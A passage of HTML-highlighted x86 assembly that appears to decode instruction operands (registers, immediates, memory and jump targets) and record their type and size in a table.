</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; pseudo construction</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notDX0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CL0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notCL0</span><span class="sc0">                  </span><span class="sc1">; check if we have a CL comp.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; as exemple</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notCL0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">RegWord</span><span class="sc0">              </span><span class="sc1">; watch if we need a register</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notreg</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4reg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; set reg value</span><span class="sc0">

</span><span class="sc5">metestit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Reg32</span><span class="sc0">                </span><span class="sc1">; watch register size</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Reg16</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Reg8</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">fixit</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">RegWord</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipincit</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc5">skipincit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getsize</span><span class="sc0">             </span><span class="sc1">; if not checked, detect it</span><span class="sc0">

</span><span class="sc5">fixit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; fix reg size</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notreg</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; set then we have a value</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notD1</span><span class="sc0">               </span><span class="sc1">; watch if the value is not by def 1.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalsize</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notD1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Imm32</span><span class="sc0">            </span><span class="sc1">; check if we have a calssic Imm</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notImm</span><span class="sc0">

</span><span class="sc5">Gotimm</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Imm32</span><span class="sc4">-</span><span class="sc5">Reg32</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">metestit</span><span class="sc0">            </span><span class="sc1">; self detect size</span><span class="sc0">

</span><span class="sc5">loadit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">doitbt</span><span class="sc0">              </span><span class="sc1">; fill value depending the size</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">doitbt</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">doitbt2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; copy word</span><span class="sc0">

</span><span class="sc5">doitbt2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">additanyway</span><span class="sc0">         </span><span class="sc1">; check dword</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalue</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; copy it</span><span class="sc0">

</span><span class="sc5">additanyway</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argvalsize</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; add to instruction ptr</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; thats all folks</span><span class="sc0">

</span><span class="sc1">; Meeeeeeeeeeeeeeeeeeemory! ---------------------------------------------</span><span class="sc0">

</span><span class="sc5">notImm</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Thatsmem1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; fill as it was memoery</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemWord</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notMem</span><span class="sc0">

</span><span class="sc5">Thatsmem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemWord</span><span class="sc4">-</span><span class="sc5">RegWord</span><span class="sc0">         </span><span class="sc1">; load memory size</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">metestit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4mem</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc2">11b</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dontrefix</span><span class="sc0">               </span><span class="sc1">; is it a register?</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; switch type</span><span class="sc0">

</span><span class="sc5">tadam</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dontrefix</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">100b</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notextended</span><span class="sc0">                 </span><span class="sc1">; watch if we have</span><span class="sc0">
                            </span><span class="sc1">; extended reg</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; set it to 3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">         

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">                 </span><span class="sc1">; not an extend2</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notextended</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tadam2</span><span class="sc0">

</span><span class="sc5">notextended</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; check operator 0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notextended2</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">                     </span><span class="sc1">; not an extend2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tadam</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; check if we are </span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">notamam</span><span class="sc0">                     </span><span class="sc1">; switched mode</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc2">20</span><span class="sc0">         </span><span class="sc1">; put a warning about</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">notextended2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc2">01b</span><span class="sc0">           </span><span class="sc1">; check if the</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tadam2</span><span class="sc0">                      </span><span class="sc1">; following val is a</span><span class="sc0">
                            </span><span class="sc1">; a bit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">

</span><span class="sc5">tadam2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getsize</span><span class="sc0">                     </span><span class="sc1">; get the size</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">                      </span><span class="sc1">; load it</span><span class="sc0">

</span><span class="sc5">notMem</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemOffs</span><span class="sc0">                    </span><span class="sc1">; check if we have</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notMemOfs</span><span class="sc0">                   </span><span class="sc1">; a memofs</span><span class="sc0">

</span><span class="sc5">notamam</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getsize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tadam2</span><span class="sc0">                      </span><span class="sc1">; do it!</span><span class="sc0">

</span><span class="sc5">notMemOfs</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Far0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getNear0</span><span class="sc0">                    </span><span class="sc1">; check if we have</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                       </span><span class="sc1">; a far dest</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">                      </span><span class="sc1">; just fix the size</span><span class="sc0">

</span><span class="sc5">getNear0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Near0</span><span class="sc0">                   </span><span class="sc1">; check if we have</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotShort0</span><span class="sc0">                   </span><span class="sc1">; Near, load near</span><span class="sc0">
                            </span><span class="sc1">; val</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">

</span><span class="sc5">NotShort0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Short0</span><span class="sc0">                  </span><span class="sc1">; watch if we have </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotDisp0</span><span class="sc0">                    </span><span class="sc1">; a short</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadit</span><span class="sc0">                      </span><span class="sc1">; load the value</span><span class="sc0">

</span><span class="sc5">NotDisp0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemFar</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notfar</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Mem</span><span class="sc0">                     </span><span class="sc1">; we now have a mem</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Thatsmem</span><span class="sc0">

</span><span class="sc5">notfar</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">9</span><span class="sc0">          </span><span class="sc1">; set arg type 9</span><span class="sc0">
                            </span><span class="sc1">; here we begin</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CRn</span><span class="sc0">                     </span><span class="sc1">; strange operands</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notCRn</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DRn</span><span class="sc0">                     </span><span class="sc1">; watch for CRn/TRn/DRn</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4seg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notCRn</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">         </span><span class="sc1">; then watch if</span><span class="sc0">
    
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SegOld</span><span class="sc0">                  </span><span class="sc1">; we have a seg/segold</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notSegType</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4seg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notSegType</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Mem64</span><span class="sc0">                   </span><span class="sc1">; watch for a MEM64</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notBlahType</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Mem32</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Thatsmem</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notBlahType</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemWIm8</span><span class="sc0">                </span><span class="sc1">; watch for 3 operand operation</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">notMemWtype</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemWord</span><span class="sc0">             </span><span class="sc1">; load it as a word</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Thatsmem</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">15</span><span class="sc0">     </span><span class="sc1">; set strange type</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

